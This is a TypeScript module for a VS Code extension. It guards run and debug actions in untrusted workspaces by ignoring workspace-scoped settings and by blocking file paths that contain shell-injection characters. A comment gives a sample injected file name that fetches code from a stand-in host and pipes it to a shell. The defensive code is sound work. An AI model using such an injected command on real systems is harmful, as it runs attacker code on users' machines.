import * as vscode from 'vscode';

/** Whether the current workspace is trusted to run code from its configuration. */
export function isWorkspaceTrusted(): boolean {
  return vscode.workspace.isTrusted;
}

/**
 * Read a configuration value, honouring workspace-scoped values only when the
 * workspace is trusted; global (user) and default values always apply. This is
 * the single chokepoint that stops a malicious `.vscode/settings.json` from
 * injecting run behavior (CVE-2025-65715 class), so all run-affecting settings
 * must be read through it.
 */
export function trustedConfig<T>(section: string, key: string): T | undefined {
  const cfg = vscode.workspace.getConfiguration(section);
  if (isWorkspaceTrusted()) {
    return cfg.get<T>(key);
  }
  const inspected = cfg.inspect<T>(key);
  return inspected?.globalValue ?? inspected?.defaultValue;
}

// Characters that stay special inside the double quotes we wrap paths in, so a
// crafted name like `$(curl evil|sh).js` could break out and inject a command.
const INJECTION_CHARS = /[$`"\n\r]/;

/**
 * Whether a path could break out of shell quoting. Used to refuse running files
 * from untrusted workspaces, where a malicious repo controls the file names.
 */
export function pathHasInjectionRisk(filePath: string): boolean {
  return INJECTION_CHARS.test(filePath);
}

/**
 * Guard a run/debug of `uri`: in an untrusted workspace, refuse file names that
 * could break out of shell quoting and warn the user. Returns true if blocked.
 */
export function blockedByUntrustedPath(uri: vscode.Uri): boolean {
  if (isWorkspaceTrusted() || !pathHasInjectionRisk(uri.fsPath)) {
    return false;
  }
  void vscode.window.showWarningMessage(
    `Run/Debug: refusing to run "${uri.path.split('/').pop()}" — its path has characters that are unsafe in an untrusted workspace. Trust this workspace to run it.`,
  );
  return true;
}
